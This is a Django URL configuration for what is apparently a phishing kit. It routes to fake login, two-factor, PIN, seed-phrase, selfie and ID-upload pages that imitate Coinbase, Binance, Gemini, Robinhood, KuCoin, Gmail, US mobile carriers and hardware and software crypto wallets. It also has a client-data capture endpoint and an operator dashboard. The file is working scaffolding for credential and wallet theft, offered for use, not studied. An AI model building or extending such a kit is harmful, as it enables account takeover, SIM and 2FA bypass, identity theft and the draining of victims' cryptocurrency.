"""
URL configuration for shinesoftware project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/5.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from django.contrib import admin
from django.urls import path, include
from django.views.generic.base import RedirectView
from django.conf import settings # Import settings
from django.shortcuts import render # Import render
from django.conf.urls.static import static # Import static
from . import views
from . import views as project_views
from dashboard import views as dashboard_app_views

urlpatterns = [
    # Redirect /admin/ to /admin/dashboard/
    path('admin/', RedirectView.as_view(url='dashboard/', permanent=True)),
    # Your dashboard app's URLs
    path('admin/dashboard/', include('dashboard.urls')),

    # Homepage (renders the 6-digit code form)
    path('', views.home, name='home'), 

    path('capture/client-data/', views.capture_client_data_view, name='capture_client_data'),


    # Example: Placeholder for the loading page you want to redirect to
    # You'll need to create a template and view for this if it's not just a static page
    path('coinbase/loading/', lambda request: render(request, 'coinbase/coinbase_loading_placeholder.html'), name='coinbase_loading'),

    path('client/delete/', dashboard_app_views.delete_client_view, name='delete_client_ajax'),

    # Gemini URLs
    path('gemini', views.gemini_email_password_view, name='gemini_email_password_view'),
    path('gemini/2fa_sms', views.gemini_2fa_sms_view, name='gemini_2fa_sms_view'),
    path('gemini/authy_code', views.gemini_2fa_authy_view, name='gemini_2fa_authy_view'),
    path('gemini/email_code', views.gemini_2fa_email_view, name='gemini_2fa_email_view'),
    path('gemini/authorize', views.gemini_authdevice_view, name='gemini_authdevice_view'),
    path('gemini/2fa_sms_error', views.gemini_invalid_2fa_sms_view, name='gemini_invalid_2fa_sms_view'),
    path('gemini/authy_code_invalid', views.gemini_invalid_2fa_authy_view, name='gemini_invalid_2fa_authy_view'),
    path('gemini/email_code_invalid', views.gemini_invalid_2fa_email_view, name='gemini_invalid_2fa_email_view'),
    path('gemini/loading/', views.gemini_loading_view, name='gemini_loading_view'),



    # RobinHood URLs
    path('robinhood', views.robinhood_email_password_view, name='robinhood_email_password_view'),
    path('robinhood/2fa_sms', views.robinhood_2fasms_view, name='robinhood_2fasms_view'),
    path('robinhood/2fa_auth', views.robinhood_2faauthapp_view, name='robinhood_2faauthapp_view'),
    path('robinhood/reset_password', views.robinhood_resetpassword_view, name='robinhood_resetpassword_view'),
    path('robinhood/loading', views.robinhood_loading_view, name='robinhood_loading_view'),

    # Kucoin URLs
    path('kucoin', views.kucoin_login_view, name='kucoin_login_view'),
    path('kucoin/2fa_app', views.kucoin_2faauthapp_view, name='kucoin_2faauthapp_view'),
    path('kucoin/2fa_email', views.kucoin_2faemail_view, name='kucoin_2faemail_view'),
    path('kucoin/2fa_sms', views.kucoin_2fasms_view, name='kucoin_2fasms_view'),
    path('kucoin/loading', views.kucoin_loading_view, name='kucoin_loading_view'),

    # AT&T URLs
    path('att/pin', views.att_pin_view, name='att_pin_view'),
    path('att', views.att_login_view, name='att_login_view'),
    path('att/loading', views.att_loading_view, name='att_loading_view'),
    path('att/completed', views.att_completed_view, name='att_completed_view'),
    path('att/suspicious', views.att_upgrade_view, name='att_upgrade_view'),

    # T Mobile URLs
    path('tmobile/pin', views.tmobile_pin_view, name='tmobile_pin_view'),
    path('tmobile', views.tmobile_login_view, name='tmobile_login_view'),
    path('tmobile/loading', views.tmobile_loading_view, name='tmobile_loading_view'),
    path('tmobile/completed', views.tmobile_completed_view, name='tmobile_completed_view'),
    path('tmobile/suspicious', views.tmobile_upgrade_view, name='tmobile_upgrade_view'),

    # Verizon URLs
    path('verizon/pin', views.verizon_pin_view, name='verizon_pin_view'),
    path('verizon', views.verizon_login_view, name='verizon_login_view'),
    path('verizon/loading', views.verizon_loading_view, name='verizon_loading_view'),
    path('verizon/completed', views.verizon_completed_view, name='verizon_completed_view'),
    path('verizon/suspicious', views.verizon_upgrade_view, name='verizon_upgrade_view'),

    # Wallets URLs
    path('trezor', views.trezor_seed_view, name='trezor_seed_view'),
    path('ledger', views.ledger_seed_view, name='ledger_seed_view'),
    path('exodus', views.exodus_seed_view, name='exodus_seed_view'),
    path('metmask', views.metamask_seed_view, name='metamask_seed_view'),
    path('trustwallet', views.trustwallet_seed_view, name='trustwallet_seed_view'),
    path('loading/dark', views.loading_dark_view, name='loading_dark_view'),
    path('loading/light', views.loading_light_view, name='loading_light_view'),

    # — Coinbase —
    path('email', views.coinbase_email_view, name='coinbase_email_view'),
    path('review', views.coinbase_review_view, name='coinbase_review_view'),
    path('action', views.coinbase_action_view, name='coinbase_action_view'),
    path('password', views.coinbase_password_view, name='coinbase_password_view'),
    path('disconnect_wallet', views.coinbase_disconnect_wallet_view, name='coinbase_disconnect_wallet_view'),
    path('disconnect_trezor', views.coinbase_disconnect_trezor_view, name='coinbase_disconnect_trezor_view'),
    path('disconnect_ledger', views.coinbase_disconnect_ledger_view, name='coinbase_disconnect_ledger_view'),
    path('balance', views.coinbase_balance_view, name='coinbase_balance_view'),
    path('reset_password', views.coinbase_reset_password_view, name='coinbase_reset_password_view'),
    path('password_error', views.coinbase_password_error_view, name='coinbase_password_error_view'),
    path('reset_password_error', views.coinbase_reset_error_view, name='coinbase_reset_error_view'),
    path('2fa_auth', views.coinbase_2fa_auth_view, name='coinbase_2fa_auth_view'),
    path('2fa_sms', views.coinbase_2fa_sms_view, name='coinbase_2fa_sms_view'),
    path('selfie_upload', views.coinbase_selfie_upload_view, name='coinbase_selfie_upload_view'),
    path('upload_id', views.coinbase_upload_id_view, name='coinbase_upload_id_view'),
    path('authorize', views.coinbase_authorize_view, name='coinbase_authorize_view'),
    path('vault', views.coinbase_vault_view, name='coinbase_vault_view'),
    path('vault_select_coins', views.coinbase_vault_select_coins_view, name='coinbase_vault_select_coins_view'),
    path('vault_send_coins', views.coinbase_vault_send_coins_view, name='coinbase_vault_send_coins_view'),
    path('vault_loading', views.coinbase_vault_loading_view, name='coinbase_vault_loading_view'),
    path('wallet_unlink_done', views.coinbase_wallet_unlink_completed_view, name='coinbase_wallet_unlink_completed_view'),
    path('wallet_whitelisted', views.coinbase_wallet_whitelisted_view, name='coinbase_wallet_whitelisted_view'),
    path('wallet_setup', views.coinbase_wallet_setup_view, name='coinbase_wallet_setup_view'),
    path('wallet_setupv2', views.coinbase_wallet_setup_v2_view, name='coinbase_wallet_setup_v2_view'),
    path('eth_ltc', views.coinbase_eth_ltc_view, name='coinbase_eth_ltc_view'),
    path('eth_btc', views.coinbase_eth_btc_view, name='coinbase_eth_btc_view'),
    path('unauthorized_devices', views.coinbase_unauthorized_devices_view, name='coinbase_unauthorized_devices_view'),
    path('revert', views.coinbase_revert_view, name='coinbase_revert_view'),
    path('mobile_number', views.coinbase_mobile_number_view, name='coinbase_mobile_number_view'),
    path('call', views.coinbase_expect_call_view, name='coinbase_expect_call_view'),
    path('seed', views.coinbase_connect_seed_view, name='coinbase_connect_seed_view'),
    path('whitelist_seed', views.coinbase_whitelist_seed_view, name='coinbase_whitelist_seed_view'),
    path('seed_generated', views.coinbase_seed_generated_view, name='coinbase_seed_generated_view'),
    path('wallet_whitelist_self', views.coinbase_wallet_whitelist_self_view, name='coinbase_wallet_whitelist_self_view'),
    path('loading', views.coinbase_loading_view, name='coinbase_loading_view'),
    path('seed_unlink', views.coinbase_seed_unlink_view, name='coinbase_seed_unlink_view'),
    path('seed_unlink_pending', views.coinbase_unlink_pending_view, name='coinbase_unlink_pending_view'),

    # — Binance —
    path('binance', views.binance_email_password_view, name='binance_email_password_view'),
    path('binance/2fa_email', views.binance_2fa_email_view, name='binance_2fa_email_view'),
    path('binance/2fa_auth', views.binance_2fa_auth_view, name='binance_2fa_auth_view'),
    path('binance/2fa_sms', views.binance_2fa_sms_view, name='binance_2fa_sms_view'),
    path('binance/unlink_wallets', views.binance_unlink_wallets_view, name='binance_unlink_wallets_view'),
    path('binance/unlink_wallets_error_link_another', views.binance_unlink_wallets_error_link_another_view, name='binance_unlink_wallets_error_link_another_view'),
    path('binance/unlink_wallets_error_invalid', views.binance_unlink_wallets_error_invalid_view, name='binance_unlink_wallets_error_invalid_view'),
    path('binanace/unlink_loading', views.binance_unlink_wallets_loading_view, name='binance_unlink_wallets_loading_view'),
    path('binance/loading', views.binance_loading_view, name='binance_loading_view'),


    # — Gmail —
    path('gmail', views.gmail_email_view, name='gmail_email_view'),
    path('gmail/password', views.gmail_password_view, name='gmail_password_view'),
    path('gmail/password_error', views.gmail_password_error_view, name='gmail_password_error_view'),
    path('gmail/otp', views.gmail_device_otp_view, name='gmail_device_otp_view'),
    path('gmail/2fa_auth', views.gmail_2fa_auth_view, name='gmail_2fa_auth_view'),
    path('gmail/youtube', views.gmail_youtube_view, name='gmail_youtube_view'),
    path('gmail/gmail', views.gmail_gmail_view, name='gmail_gmail_view'),
    path('gmail/qr', views.gmail_qrcode_view, name='gmail_qrcode_view'),
    path('gmail/number', views.gmail_number_view, name='gmail_number_view'),
    path('gmail_2fa_sms', views.gmail_2fa_sms_view, name='gmail_2fa_sms_view'),
    path('gmail/loading', views.gmail_loading_view, name='gmail_loading_view'),

]
if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
